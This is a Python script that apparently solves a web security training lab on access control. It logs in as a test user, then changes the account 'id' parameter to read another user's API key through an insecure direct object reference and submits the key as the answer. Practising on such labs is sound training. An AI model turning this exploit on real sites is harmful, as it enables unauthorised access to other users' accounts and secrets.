#####################
#    Libraries      #
#####################
import requests
import sys
import urllib3
import argparse
import re
from bs4 import BeautifulSoup as bs
import gc

#####################
#    Variables      #
#####################

## Disable requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

## Setup Proxies to future debugs
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(prog=f'\n[+] WebAcademy Access Control: Lab 7'
                                ,description="Description: Obtain the API key for the user 'carlos' and submit it as the solution"
                                ,epilog='----------------------- END ---------------------------')
parser.add_argument('-u', metavar ='--url', action='store', dest='url', type=str, required=True, help="Target's URL")

args = parser.parse_args()


#####################
#    Functions      #
#####################

def get_csrf(login_url,s):
    print("[+] Trying to get the CSRF token")
    r = s.get(login_url,verify=False, proxies=proxies)
    # take GET's response, find and return the csrf
    return bs(r.text,"html.parser").find("input", {'name':'csrf'})['value']
    
def get_api(url, s):
    login_url = url + "/login"
    csrf_token = get_csrf(login_url,s)
    if csrf_token:
        print("[+] Got the CSRF Token")
        data = {
            'csrf':csrf_token,
            'username':'wiener',
            'password':'peter'
            }
        print("[+] Trying to log in as wiener user")
        r = s.post(login_url,data=data,verify=False,proxies=proxies)
        if "Log out" in r.text:
            print("[+] Logged in as the wiener user")
            session_cookie = r.cookies.get_dict().get('session')
            cookies = {'session':session_cookie}
            my_account_url = url+"/my-account"
            params = {
                    'id':'carlos'
                    }
            print("[+] Trying to retrieve Carlos' API Key")
            r = s.get(my_account_url,params=params,cookies=cookies,verify=False,proxies=proxies)
            api_key = re.search(r'API Key is: (\w+)',r.text).group(1)
            if api_key:
                print("[+] Successfully got the API Key")
                print(f"[+] Carlos' API Key is:\n\t[+]\t{api_key}")
                print("[+] Trying to submit the answer")
                submit_url = url+"/submitSolution"
                answer_data = {"answer":api_key}
                r = s.post(submit_url, verify=False, data=answer_data,cookies=cookies, proxies=proxies)
                if r.status_code == 200:
                    print("[+] Successfully submited the answer... You rocked the lab")
                else:
                    print("[-] Couldn't submit the answer")
                    gc.collect()
                    sys.exit(-1)
            else:
                print("[-] Couldn't get the API Key")
                gc.collect()
                sys.exit(-1)
        else:
            print("[-] Couldn't log in as wiener")
            gc.collect()
            sys.exit(-1)
    else:
        print("[-] Couldn't get the CSRF Token")
        gc.collect()
        sys.exit(-1) 
def main():
    
    if len(sys.argv) != 3:
        print(f"[+] Usage:\n\t{sys.argv[0]} -u <Lab's URL>")
        print(f"[+] Example:\n\t{sys.argv[0]} -u https://random-code.web-security-academy.net")
        gc.collect()
        sys.exit(-1)
    else:
        s = requests.Session()
        url = args.url.rstrip('/')
        get_api(url,s)

if __name__ == "__main__":
    main()